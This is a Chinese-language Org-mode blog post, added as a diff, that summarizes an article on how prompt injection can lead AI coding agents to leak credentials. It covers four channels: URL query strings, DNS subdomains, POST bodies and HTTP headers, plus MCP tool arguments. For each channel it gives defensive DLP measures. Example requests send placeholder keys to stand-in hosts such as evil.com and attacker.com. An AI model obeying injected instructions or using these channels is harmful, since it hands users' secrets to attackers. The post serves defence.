@@ -1,0 +1,122 @@
+#+TITLE: 你的AI代理正在偷你的密钥——四种你没想到的泄露通道
+#+AUTHOR: lujun9972
+#+TAGS: 无主之地, AI安全, 提示注入, 密钥泄露, DLP
+#+DATE: [2026-04-16 三]
+#+LANGUAGE:  zh-CN
+#+OPTIONS:  H:6 num:nil toc:t \n:nil ::t |:t ^:nil -:nil f:t *:t <:nil
+
+原文：[[https://dzone.com/articles/4-ways-your-ai-coding-agent-exfiltrates-secrets][4 Ways Your AI Coding Agent Exfiltrates Secrets]]
+
+* 一个不该被忽视的事实
+
+你每天用的 AI 编码代理——Claude Code、Cursor、Windsurf——能读取你的环境变量、配置文件和源代码。同时，它们还在不停地发 HTTP 请求：安装依赖、调用 API、拉取文档。你的代理 *既有你的钥匙，又有通向外面的门* 。
+
+一个藏在依赖包、工具响应甚至 Markdown 文件里的提示注入，就能让代理把你的凭据夹在下一个出站请求里发出去。代理不知道有什么不对，因为那条指令看起来就是一个普通任务。
+
+Josh Waldrep 在 DZone 上分析了这个问题，指出了四种不同的泄露通道。然而大多数安全工具只能发现第一种。
+
+* 四条通道
+
+** 通道一：URL 明文
+
+最简单粗暴的方式。注入指令让代理请求一个带密钥的 URL：
+
+#+BEGIN_SRC http
+GET https://evil.com/collect?key=AKIAIOSFODNN7EXAMPLE
+#+END_SRC
+
+密钥直接出现在查询字符串或路径里。任何检查 URL 的网络代理都能用正则匹配到已知的密钥格式（AWS key、GitHub token、API key）。
+
+*防御* ：在正向代理上做 URL 级别的 DLP（Data Loss Prevention）扫描。这是目前 *覆盖最广的一层* ，大多数代理安全工具都在做这个。
+
+*局限* ：只抓得到 URL 里出现的密钥。知道有 URL 扫描的攻击者，会直接换下面三条路走。
+
+** 通道二：DNS 查询
+
+这一条很隐蔽。注入指令让代理请求 =https://sk-ant-XXXXX.attacker.com/ping= 。HTTP 请求还没开始，代理的 HTTP 客户端先要解析主机名。这个 DNS 查询会打到攻击者的域名服务器：
+
+#+BEGIN_SRC dns
+sk-ant-api03-XXXXX.attacker.com. IN A
+#+END_SRC
+
+攻击者在查询日志里看到完整的子域名，密钥就到手了。没有请求体，没有查询参数，没有任何 HTTP 流量。 *一个 DNS 查询就够了* 。
+
+*防御* ：DLP 扫描必须在 DNS 解析 *之前* 运行。如果代理先解析主机名再应用安全规则（大多数正是这么做的），密钥已经泄露了。扫描顺序至关重要：先模式匹配，再解析。
+
+*局限* ：大多数代理工具在应用安全规则之前就已经完成了 DNS 解析。DNS-over-HTTPS 让拦截更难。
+
+** 通道三：POST 请求体
+
+代理用你的凭据作为参数调用一个 API：
+
+#+BEGIN_SRC http
+POST https://api.legitimate-service.com/v1/notes
+Content-Type: application/json
+
+{"title": "config", "body": "AKIAIOSFODNN7EXAMPLE"}
+#+END_SRC
+
+URL 干干净净，主机名甚至可能在白名单上。所有 URL 级别的扫描器看到的都是一个正常 API 调用。密钥藏在请求体里，URL 扫描根本碰不到。
+
+代理时时刻刻都在发 POST 请求，这跟正常行为完全无法区分。
+
+*防御* ：请求体 DLP 扫描。代理缓冲请求体，从 JSON、表单字段、multipart 中提取文本，对提取出的内容跑密钥模式匹配。解析失败就阻断（fail-closed）。
+
+*局限* ：HTTPS 流量走正向代理时用的是 CONNECT 隧道，内容是加密的。代理只看得到主机名，看不到请求体。要完整扫描请求体，要么做 TLS 拦截（MITM，需要受信 CA 证书），要么把请求路由到代理替你发起请求的端点。
+
+** 通道四：HTTP 头部
+
+代理设置一个带凭据的自定义头部：
+
+#+BEGIN_SRC http
+GET https://api.example.com/data
+Authorization: Bearer sk-ant-api03-abc123def456
+X-Debug-Token: ghp_ABCDEFghijklmnopQRSTUVWXyz0123456789
+#+END_SRC
+
+这是最狡猾的通道。代理在每次 API 调用时都会设置 Authorization 头部。发给 =api.openai.com= 的 =Bearer= 头部是正常使用，发给 =evil.com= 就是泄露。而代理把你的 OpenAI key 发给其他服务，是纯 DLP 很难判定的灰色地带。
+
+*防御* ：头部 DLP 扫描。至少扫描已知会携带凭据的头部（Authorization、Cookie、X-Api-Key）。更激进的模式：扫描所有头部，包括头部名称（密钥可以被编码为自定义头部名称，比如 =X-AKIA1234= ）。
+
+*局限* ：跟请求体一样受 CONNECT 隧道限制。而且合法 API 调用本身就在头部里发凭据，白名单特定 key 对应特定目标虽然有用，但配置量大且无法自动扩展。
+
+* MCP：第五条通道
+
+HTTP 之外还有一条路：MCP（Model Context Protocol）工具调用。代理使用 MCP 服务器时，工具参数是独立的数据通路。代理可以把你的凭据作为工具参数传过去，MCP 服务器想转发到哪里就转发到哪里。
+
+扫描 MCP 工具输入里的密钥需要在 MCP 服务器外包裹一层检查，架构上跟 HTTP 代理扫描完全不同，但解决的是同一个问题。
+
+* 工具现状
+
+AI 代理安全领域还很年轻：
+
+| 通道     | 防御手段              | 工具状态                           |
+|----------+-----------------------+------------------------------------|
+| URL      | 代理 URL 级 DLP       | 多数工具已覆盖                     |
+| DNS      | 解析前 DLP 扫描       | 稀缺，需要扫描顺序意识             |
+| 请求体   | 请求体 DLP            | 新兴，受 CONNECT 隧道限制          |
+| 头部     | 头部 DLP              | 新兴，合法使用产生误报             |
+
+开源方面，Pipelock 覆盖了四个通道（不过请求体和头部扫描目前限于明文代理流量，TLS 拦截还在开发中）。商业方面，Protect AI、Lasso Security 等正在进入这个领域。OWASP Top 10 for LLM Applications 把这类攻击归类在"Sensitive Information Disclosure"下。
+
+共同模式：一个正向代理坐在代理和互联网之间，扫描出站流量中已知的密钥模式。差异在于 *扫描什么* （URL only vs URL + DNS + body + headers）和 *什么时候扫描* （DNS 解析前还是后）。
+
+* 仍未解决的问题
+
+即使四个 HTTP 通道全部覆盖，有些泄露技术仍然很难阻止：
+
+- *编码载荷* ：Base64 编码后绕过正则匹配。基于熵的检测有帮助，但合法编码数据也会触发误报
+- *分块泄露* ：每次请求发一个字符，几百次调用凑齐整个密钥。单请求扫描无法重建密钥，会话级数据预算只是部分缓解
+- *隐写术* ：把密钥编码进图片像素或音频样本中上传。二进制内容分析是完全不同的问题域
+- *合法目标滥用* ：把你的 OpenAI key 发给 =api.openai.com= 的 Authorization 头部，既是正确使用，也可能是泄露给第三方系统。上下文很重要，自动化工具搞不定上下文
+
+根本矛盾：AI 代理需要网络访问和凭据访问才能工作。去掉任何一个，代理就废了。安全挑战在于监控两者的交集，同时不破坏工作流。
+
+* 你现在能做的
+
+四条立即可行的建议：
+
+1. *代理流量走代理* 。哪怕只有基本的 URL 扫描也比裸奔强。在代理环境中设置 =HTTPS_PROXY= 和 =HTTP_PROXY=
+2. *审计代理权限* 。检查哪些环境变量、配置文件和密钥对代理可见，移除它不需要的
+3. *域名白名单* 。如果你的代理只需要 =api.anthropic.com= 、 =registry.npmjs.org= 和 =github.com= ，别让它跟其他任何东西通信
+4. *关注非常规通道* 。只扫 URL 不够。DNS、请求体和头部是下一轮攻击的目标
